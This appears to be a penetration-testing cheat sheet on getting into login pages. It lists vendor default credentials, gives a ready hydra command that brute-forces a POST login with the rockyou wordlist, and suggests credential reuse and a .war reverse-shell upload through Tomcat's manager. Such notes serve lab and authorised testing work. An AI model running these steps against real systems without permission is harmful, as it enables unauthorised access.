## Goal
Beat login pages with default creds, reuse, or brute force before anything fancy. Many panels open to admin:admin.

**Checklist**
- [ ] tried product default creds? (admin:admin, vendor defaults)
- [ ] username hints from smtp/ldap/snmp?
- [ ] brute a POST login (only if no lockout)?
- [ ] reused creds found elsewhere?

# Commands

### Defaults first
```bash
# tomcat tomcat:tomcat | jenkins admin:admin | phpmyadmin root:(blank) | grafana admin:admin
# search "<product> default credentials"
```

### Brute a POST login (hydra)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
```

### Helpline
```bash
# capture the POST in Burp for exact field names + the failure string hydra matches on
# reuse creds from smtp/snmp/db here FIRST — reuse beats brute
# tomcat /manager/html + creds -> upload a .war reverse shell
```
